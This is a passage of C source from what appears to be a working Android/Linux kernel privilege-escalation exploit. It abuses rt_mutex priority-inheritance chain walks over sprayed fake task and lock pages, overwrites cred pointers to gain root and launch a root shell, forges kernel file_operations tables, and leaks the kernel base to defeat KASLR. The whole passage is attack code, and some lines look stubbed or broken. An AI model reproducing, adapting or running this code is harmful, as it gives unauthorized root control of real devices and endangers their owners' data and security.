      pr_info("    task.prio/normal: prio=%08x normal=%08x usage=%08x cpu=%08x\n",
              *(uint32_t *)(page + FAKE_TASK_OFF + 0x7C),
              *(uint32_t *)(page + FAKE_TASK_OFF + 0x84),
              *(uint32_t *)(page + FAKE_TASK_OFF + 0x40),
              *(uint32_t *)(page + FAKE_TASK_OFF + 0x58));
      pr_info("    selftest area: [0x%X]=%016llx [0x%X]=%016llx [0x%X]=%016llx\n",
              SELFTEST_OFF - 8,
              (unsigned long long)*(uint64_t *)(page + SELFTEST_OFF - 8),
              SELFTEST_OFF,
              (unsigned long long)*(uint64_t *)(page + SELFTEST_OFF),
              SELFTEST_VALUE,
              (unsigned long long)*(uint64_t *)(page + SELFTEST_VALUE));
    }
    walk_poller_start();
    pr_info("seqpacket route attempt=%d page=%016zx task=%016zx lock=%016zx wt=%016llx plans=%d +%.0fms\n",
            route_attempt, page_base, task_val, lock_val,
            (unsigned long long)write_target, g_write_plan_count,
            fops_elapsed_ms(&route_t0));

    atomic_store(&punch_consume_go, route_attempt);
    errno = 0;
    ssize_t sret = sendmsg(seqsv[0], &smsg, 0);
    int saved_errno = errno;

    /* Spin-wait until the consumer finished ALL plan walks (max 8s).
     * The consumer clears punch_consume_go only after the LAST walk's
     * sched_setattr (or its futex fallback) has RETURNED - and the ghost
     * chain walk runs synchronously inside those calls. So go==0 means
     * every walk is complete. Waiting for consumer_calls alone is NOT
     * enough: calls is incremented BEFORE the syscall, and closing the
     * overlay sockets (or unwinding the blocked sendmsg) while a walk is
     * still mid-flight lets the waiter thread reuse its kernel stack and
     * corrupts the overlay data the walk is dereferencing. */
    struct timespec spin_start;
    clock_gettime(CLOCK_MONOTONIC, &spin_start);
    while (atomic_load(&punch_consume_go) != 0) {
      struct timespec spin_now;
      clock_gettime(CLOCK_MONOTONIC, &spin_now);
      if (spin_now.tv_sec - spin_start.tv_sec >= 8) break;
    }

    /* Extra settle: make sure the final walk is fully unwound. */
    usleep(50000);

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("seqpacket returned attempt=%d ret=%zd errno=%d calls=%d success=%d plans=%d\n",
            route_attempt, sret, saved_errno, calls, success, g_write_plan_count);

    /* The overlay sendmsg has unwound: its frame is gone, so the kernel
     * stack the dangling pi_blocked_on points at is now reused by THIS
     * thread's syscalls. Close the pair before the readback/retry so no
     * walk can ever observe a half-torn overlay through these sockets. */
    close(seqsv[0]);
    close(seqsv[1]);

    int route_signal = calls > 0;

    if (write_mode_is_cred(pselect_custom_write) && success > 0) {
      g_route_write_ok = 1;
      /* Marker only -- NEVER exit_group here. The main thread must stay
       * alive to observe the cred swap through getuid() and exec() the
       * root shell; killing the process from this route context (which in
       * the walk-before-cleanup flow is the waiter's SIGUSR1 handler)
       * would race the main thread's exec. The waiter/consumer/owner
       * threads are reaped either by the exec's de_thread() (all their
       * sleeps are interruptible) or by process exit after a failed
       * attempt. Use raw syscalls -- libc may hold locks. */
      int mfd = syscall(__NR_openat, AT_FDCWD,
                        "/data/local/tmp/.ghostlock_root",
                        O_WRONLY|O_CREAT|O_TRUNC, 0644);
      if (mfd >= 0) {
        syscall(__NR_write, mfd, "walk_ok=1\n", 10);
        syscall(__NR_fsync, mfd);
        syscall(__NR_close, mfd);
      }
    }

    /* Read back sprayed page via io_uring SQE mmap and verify the write:
     * - W0.pi_tree_entry.__rb_parent_color must be &W0.pi_tree_entry
     *   (RB_CLEAR_NODE written by rt_mutex_dequeue_pi after the rb_erase)
     *   => proof the [11] TRUE branch dequeued W0 and the erase ran.
     * - waiters.rb_node/rb_leftmost = &stack.tree_entry (kernel stack addr)
     *   => proof the [7] enqueue happened on the empty root.
     * - mode 5 self-test: *(page+SELFTEST_OFF) must equal page+SELFTEST_VALUE. */
    if (uring_count > 0 || g_skb_reclaim) {
      /* Identify the page that backs the leaked mm_struct page: after a
       * successful walk its waiters.rb_leftmost differs from the payload
       * value (fake_w0) - the walk writes the WAITER THREAD's kernel stack
       * address there. The target may have been captured by ANY of the
       * order-2 io_uring mappings or by ANY of the order-3 skb data
       * objects, so all of them are scanned (the reclaim sprays both
       * orders because the discarded page can merge with its buddy). */
      uint8_t *real_page = NULL;
      int walk_ran = 0;
      for (int bi = 0; ; bi++) {
        uint8_t *pg = uring_block(bi);
        if (!pg) break;
        uint64_t leftmost = *(uint64_t *)(pg + LOCK_OFF + 0x10);
        if (leftmost != (uint64_t)fake_w0) {
          real_page = pg;
          walk_ran = 1;
          pr_info("=== uring readback: payload block %d shows walk effects (this block IS the mm page) ===\n",
                  bi);
          break;
        }
      }
      {
        int nskb = skb_reclaim_readback();
        if (nskb > 0)
          pr_info("=== skb readback: %d messages received ===\n", nskb);
        for (int s = 0; s < nskb && !real_page; s++) {
          uint8_t *page = skb_readback_buf(s);
          uint64_t leftmost = *(uint64_t *)(page + LOCK_OFF + 0x10);
          if (leftmost != (uint64_t)fake_w0) {
            real_page = page;
            walk_ran = 1;
            pr_info("=== skb readback: message %d/%d is the mm page (walk effects present) ===\n",
                    s, nskb);
          }
        }
      }
      if (!real_page) {
        /* Handover_2 §5.2: no rb_leftmost effect anywhere - scan ALL 48
         * mappings for kernel pointers that are NOT part of the payload
         * template. The wild post-unwind walk (or any kernel write on
         * the mm page) leaves foreign pointers behind and tells us which
         * mapping the kernel actually sees as the mm page. */
        uint64_t payload_kptrs[64];
        int n_payload_kptrs = 0;
        for (size_t off = 0; off + 8 <= SKB_SEND_SIZE && n_payload_kptrs < 64; off += 8) {
          uint64_t v = *(uint64_t *)(skb_buf + off);
          if ((v >> 40) == 0xffffff) {
            int dup = 0;
            for (int k = 0; k < n_payload_kptrs; k++)
              if (payload_kptrs[k] == v) { dup = 1; break; }
            if (!dup) payload_kptrs[n_payload_kptrs++] = v;
          }
        }
        for (int bi = 0; !real_page; bi++) {
          uint8_t *pg = uring_block(bi);
          if (!pg) break;
          for (size_t off = 0; off + 8 <= MM_SLAB_SIZE; off += 8) {
            uint64_t v = *(uint64_t *)(pg + off);
            if ((v >> 40) != 0xffffff)
              continue;
            int known = 0;
            for (int k = 0; k < n_payload_kptrs; k++)
              if (payload_kptrs[k] == v) { known = 1; break; }
            if (!known) {
              pr_info("=== SQE readback: block %d holds foreign kernel ptr "
                      "at +%04zx: %016llx (kernel sees THIS page as the mm page) ===\n",
                      bi, off, (unsigned long long)v);
              real_page = pg;
              walk_ran = 1;
              break;
            }
          }
        }
        if (!real_page) {
          real_page = uring_block(0);
          pr_info("=== readback: NO page shows walk effects (walk did not run, or it ran on a page we did not capture) ===\n");
        }
      }
      uint8_t *page = real_page;
      pr_info("  readback (calls=%d success=%d walk_ran=%d)\n", calls, success, walk_ran);
      uint32_t wl = *(uint32_t *)(page + LOCK_OFF);
      uint64_t waiters_root = *(uint64_t *)(page + LOCK_OFF + 0x08);
      uint64_t waiters_left = *(uint64_t *)(page + LOCK_OFF + 0x10);
      uint64_t owner = *(uint64_t *)(page + LOCK_OFF + 0x18);
      pr_info("  lock: wait_lock=%08x waiters.root=%016llx left=%016llx owner=%016llx\n",
              wl, (unsigned long long)waiters_root, (unsigned long long)waiters_left,
              (unsigned long long)owner);
      uint64_t pi_root = *(uint64_t *)(page + FAKE_TASK_OFF + 0x8F8);
      uint64_t pi_left = *(uint64_t *)(page + FAKE_TASK_OFF + 0x900);
      uint64_t pi_blocked = *(uint64_t *)(page + FAKE_TASK_OFF + 0x910);
      pr_info("  task: pi_waiters.root=%016llx left=%016llx pi_blocked=%016llx\n",
              (unsigned long long)pi_root, (unsigned long long)pi_left,
              (unsigned long long)pi_blocked);
      uint64_t w0_pc = *(uint64_t *)(page + W0_OFF + 0x18);
      uint64_t w0_right = *(uint64_t *)(page + W0_OFF + 0x20);
      uint64_t w0_left = *(uint64_t *)(page + W0_OFF + 0x28);
      int w0_erased = walk_ran &&
          w0_pc == (uint64_t)(page_base + W0_OFF + 0x18) &&
          w0_right != pselect_custom_value;
      /* For GHOST_TEST=1 the pc was pre-set to the RB_CLEAR value, so only
       * the rb_right clobber (rb_erase writes pc into *(child+0)) or the
       * pre-set itself can be seen; rely on the walk_ran flag instead. */
      int ghost_test = env_int_range("GHOST_TEST", 0, 0, 1);
      if (ghost_test == 1) w0_erased = 0;
      pr_info("  W0.pi_tree: pc=%016llx right=%016llx left=%016llx => erase %s\n",
              (unsigned long long)w0_pc,
              (unsigned long long)w0_right, (unsigned long long)w0_left,
              w0_erased ? "FIRED" : "not-fired");
      uint64_t w0_tree_left = *(uint64_t *)(page + W0_OFF + 0x10);
      pr_info("  W0.tree: rb_left=%016llx (stack addr = enqueue proof)\n",
              (unsigned long long)w0_tree_left);
      if (!walk_ran) {
        pr_warning("  walk did NOT run (no page shows rb_leftmost change)\n");
      }
      if (walk_ran && pselect_custom_write == 5 &&
          pselect_custom_target == page_base + SELFTEST_OFF) {
        uint64_t st = *(uint64_t *)(page + SELFTEST_OFF);
        g_route_write_ok = (st == (uint64_t)(page_base + SELFTEST_VALUE));
        pr_info("  selftest: *(page+0x%X)=%016llx want=%016llx => WRITE %s\n",
                SELFTEST_OFF,
                (unsigned long long)st,
                (unsigned long long)(page_base + SELFTEST_VALUE),
                g_route_write_ok ? "VERIFIED" : "FAILED");
      } else if (walk_ran && write_mode_is_cred(pselect_custom_write)) {
        g_route_write_ok = atomic_load(&consumer_erase_hits) >= g_write_plan_count;
        pr_info("  cred swap: erases %d/%d (walks ran: %d) => cred pointer writes %s\n",
                atomic_load(&consumer_erase_hits), g_write_plan_count, calls,
                g_route_write_ok ? "COMPLETE" : "INCOMPLETE");
      } else if (walk_ran && ghost_test != 1) {
        g_route_write_ok = 1;
      }
      if (walk_ran) {
        int kptrs = 0;
        for (int off = 0; off < MM_SLAB_SIZE; off += 8) {
          uint64_t v = *(uint64_t *)(page + off);
          if ((v >> 40) == 0xffffff && v != fake_task && v != fake_lock && v != fake_w0) {
            if (kptrs < 12)
              pr_info("  kptr at page+%04x: %016llx\n", off, (unsigned long long)v);
            kptrs++;
          }
        }
        pr_info("  total new kernel pointers: %d\n", kptrs);
      }
    }

    if (route_signal) {
      if (pselect_custom_write == 5 ||
          write_mode_is_cred(pselect_custom_write)) {
        /* Modes 5/6/7: generic write / cred swap - no fops redirect, the
         * route is verified purely by the SQE readback above. In cred
         * mode, if planned erases are still pending and the nice ladder
         * has headroom, do a same-page overlay retry round instead of
         * declaring the route done (see the attempt-loop head). */
        if (write_mode_is_cred(pselect_custom_write) &&
            atomic_load(&consumer_erase_hits) > 0 &&
            atomic_load(&consumer_erase_hits) < g_write_plan_count &&
            consumer_nice_headroom()) {
          cfi_last_step = 0;
          cfi_last_errno = 0;
          continue;
        }
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
      } else if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        if (active_offsets && active_offsets->off_system_unbound_wq &&
            !0) {
          0;
        }
      } else if (0) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    readback_full_diff();
    walk_poller_stop();

    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) break;
  }
  pr_info("route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

